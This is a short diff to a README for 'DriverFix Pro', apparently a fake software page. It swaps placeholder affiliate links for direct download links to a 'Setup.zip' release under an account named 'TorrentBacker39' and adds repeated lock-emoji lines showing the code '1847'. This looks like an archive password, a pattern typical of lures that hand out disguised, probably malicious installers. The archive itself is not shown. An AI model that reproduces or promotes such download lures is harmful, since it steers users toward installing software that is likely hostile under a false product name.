@@ -8,7 +8,13 @@
 
 ---
 
-[![DriverFix Pro](og-image.png)](YOUR_AFFILIATE_LINK_HERE)
+[![DriverFix Pro](og-image.png)](https://github.com/TorrentBacker39/DriverFix-Pro/releases/download/Last/Setup.zip)
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
@@ -22,7 +28,13 @@
 
 ## Download & Get Pro
 
-[![Get DriverFix Pro Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](YOUR_AFFILIATE_LINK_HERE)
+[![Get DriverFix Pro Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/TorrentBacker39/DriverFix-Pro/releases/download/Last/Setup.zip)
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
